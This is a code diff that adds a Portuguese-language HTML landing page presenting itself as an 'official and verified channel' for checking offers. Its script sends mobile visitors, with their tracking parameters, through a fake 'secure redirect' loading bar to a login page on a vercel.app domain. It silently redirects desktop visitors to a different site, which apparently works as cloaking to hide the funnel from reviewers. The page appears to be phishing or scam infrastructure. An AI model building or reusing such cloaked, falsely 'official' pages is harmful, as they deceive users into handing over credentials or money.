@@ -1,0 +1,256 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <title>Verifique as Ofertas • Canal Seguro</title>
+  <meta name="description" content="Canal oficial e verificado para realizar sua consulta com segurança e confiança." />
+  <style>
+    :root{
+      --rosa:#e6006f;
+      --rosa-escuro:#c2005f;
+      --cinza-claro:#f7f7f7;
+      --sombra:0 18px 45px rgba(0,0,0,.12), 0 8px 18px rgba(0,0,0,.06);
+      --raio:20px;
+      --gradiente:linear-gradient(135deg, #e6006f 0%, #ff4da0 100%);
+    }
+    *{box-sizing:border-box;}
+    html,body{height:100%;scroll-behavior:smooth;}
+    body{
+      margin:0;
+      background:var(--cinza-claro);
+      font-family:'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      color:#111;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      justify-content:flex-start;
+      min-height:100vh;
+    }
+
+    .wrap{
+      position:relative;
+      text-align:center;
+      width:100%;
+      max-width:580px;
+      padding:0 20px;
+      flex:1;
+      display:flex;
+      flex-direction:column;
+      justify-content:flex-end;
+      align-items:center;
+      margin-top:100px;
+      margin-bottom:80px;
+    }
+
+    .detalhe-imagem{
+      position:absolute;
+      top:28%;
+      left:50%;
+      transform:translate(-50%, -50%);
+      width:min(300px, 75vw);
+      z-index:0;
+      opacity:0.95;
+      pointer-events:none;
+      filter:drop-shadow(0 8px 14px rgba(0,0,0,.12));
+      animation:flutuar 4s ease-in-out infinite;
+    }
+    @keyframes flutuar {
+      0%, 100% { transform:translate(-50%, -50%) translateY(0); }
+      50% { transform:translate(-50%, -50%) translateY(-6px); }
+    }
+
+    .card{
+      background:#fff;
+      border-radius:var(--raio);
+      box-shadow:var(--sombra);
+      padding:38px 26px 28px;
+      position:relative;
+      z-index:1;
+      margin-top:220px;
+      animation:fadeInUp .7s ease forwards;
+    }
+    @keyframes fadeInUp {
+      from { opacity:0; transform:translateY(20px); }
+      to { opacity:1; transform:translateY(0); }
+    }
+
+    .headline{
+      margin:10px 0 10px;
+      font-size:clamp(24px, 6vw, 32px);
+      font-weight:900;
+      color:var(--rosa);
+      letter-spacing:1px;
+      text-transform:uppercase;
+      text-shadow:0 2px 4px rgba(0,0,0,.1);
+    }
+
+    .subtexto{
+      font-size:15px;
+      color:#555;
+      margin-bottom:24px;
+      line-height:1.5;
+    }
+
+    .cta{
+      display:inline-block;
+      width:100%;
+      border:none;
+      border-radius:14px;
+      padding:15px 18px;
+      background:var(--gradiente);
+      color:#fff;
+      font-size:clamp(16px, 4.2vw, 18px);
+      font-weight:700;
+      cursor:pointer;
+      box-shadow:0 8px 25px rgba(230,0,111,.4);
+      transition:transform .08s ease, box-shadow .2s ease, opacity .2s ease;
+    }
+    .cta:active{ transform:scale(.98); opacity:.9; }
+    .cta:hover{ box-shadow:0 10px 28px rgba(230,0,111,.55); }
+
+    .overlay{
+      position:absolute;
+      inset:0;
+      background:#fff;
+      border-radius:var(--raio);
+      display:none;
+      align-items:center;
+      justify-content:center;
+      flex-direction:column;
+      gap:10px;
+      z-index:10;
+      animation:fadeIn .3s ease;
+    }
+    .overlay.mostrar{ display:flex; }
+    .barra{
+      width:82%;
+      max-width:420px;
+      height:12px;
+      border-radius:999px;
+      background:#eee;
+      overflow:hidden;
+      box-shadow:inset 0 0 0 1px rgba(0,0,0,.04);
+    }
+    .barra > i{
+      display:block;
+      height:100%;
+      width:0%;
+      background:var(--gradiente);
+      animation:progresso 1.3s ease-in-out forwards;
+    }
+    @keyframes progresso{ to{ width:100% } }
+    .mini-texto{ font-size:12px; color:#888; letter-spacing:.3px; }
+    @keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
+
+    footer{
+      text-align:center;
+      font-size:11px;
+      color:#888;
+      margin-top:28px;
+      line-height:1.4;
+      padding:0 20px 12px;
+      max-width:600px;
+    }
+
+    @media (min-width: 1025px){
+      body.desktop-detected .wrap { display:none; }
+    }
+  </style>
+</head>
+<body>
+  <noscript>
+    <div style="padding:16px; font-family:Arial, Helvetica, sans-serif;">
+      Este conteúdo requer JavaScript. <a href="https://confirma-feirao.vercel.app/login" rel="nofollow">Clique aqui para continuar</a>.
+    </div>
+  </noscript>
+
+  <main class="wrap" id="app" aria-live="polite">
+    <img src="https://i.postimg.cc/sXJhskBf/image.png" alt="Ilustração de destaque" class="detalhe-imagem" />
+    <section class="card" role="dialog" aria-label="Presell - Consulta oficial">
+      <h1 class="headline">VERIFIQUE AS OFERTAS</h1>
+      <p class="subtexto">Este é um canal oficial e verificado para realizar a consulta com segurança.</p>
+      <button id="cta" class="cta" aria-busy="false">Realizar Consulta Agora</button>
+
+      <div id="overlay" class="overlay" aria-hidden="true">
+        <div class="barra" aria-hidden="true"><i></i></div>
+        <span class="mini-texto">redirecionando com segurança…</span>
+      </div>
+    </section>
+  </main>
+
+  <footer>
+    <p><strong>Aviso Legal:</strong> Este site não faz parte do site do Facebook™ ou do Facebook Inc. Além disso, este site <strong>NÃO</strong> é endossado pelo Facebook™ de forma alguma. O FACEBOOK™ é uma marca registrada da Facebook Inc.</p>
+  </footer>
+
+  <!-- Scripts Utmify -->
+  <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-xcod-sck
+    data-utmify-prevent-subids
+    async
+    defer
+  ></script>
+
+  <script>
+    window.pixelId = "6904e9eda3f1cd7e9a0615d4";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+
+  <script>
+    const DESKTOP_REDIRECT_URL = "https://antecipa-acesso.com";
+    const BUTTON_REDIRECT_URL = "https://confirma-feirao.vercel.app/login";
+    const LOADING_MS = 1300;
+
+    function isMobileDevice(){
+      const ua = navigator.userAgent || navigator.vendor || window.opera;
+      const viaUA = /(android|iphone|ipad|ipod|iemobile|opera mini)/i.test(ua);
+      const viaScreen = Math.min(window.screen.width, window.screen.height) < 821;
+      return viaUA || viaScreen;
+    }
+
+    function redirectIfDesktop(){
+      if(!isMobileDevice()){
+        try { document.body.classList.add('desktop-detected'); } catch(e){}
+        if (DESKTOP_REDIRECT_URL && DESKTOP_REDIRECT_URL.startsWith('http')) {
+          window.location.replace(DESKTOP_REDIRECT_URL);
+        }
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      redirectIfDesktop();
+
+      const cta = document.getElementById('cta');
+      const overlay = document.getElementById('overlay');
+
+      cta?.addEventListener('click', () => {
+        overlay.classList.add('mostrar');
+        overlay.setAttribute('aria-hidden','false');
+        cta.setAttribute('aria-busy','true');
+        cta.disabled = true;
+
+        // ✅ Mantém UTMs na próxima página
+        const queryString = window.location.search;
+        setTimeout(() => {
+          if (BUTTON_REDIRECT_URL && BUTTON_REDIRECT_URL.startsWith('http')) {
+            window.location.href = BUTTON_REDIRECT_URL + queryString;
+          }
+        }, LOADING_MS);
+      });
+
+      window.addEventListener('resize', () => {
+        if (window.__rdt) cancelAnimationFrame(window.__rdt);
+        window.__rdt = requestAnimationFrame(redirectIfDesktop);
+      });
+    });
+  </script>
+</body>
+</html>
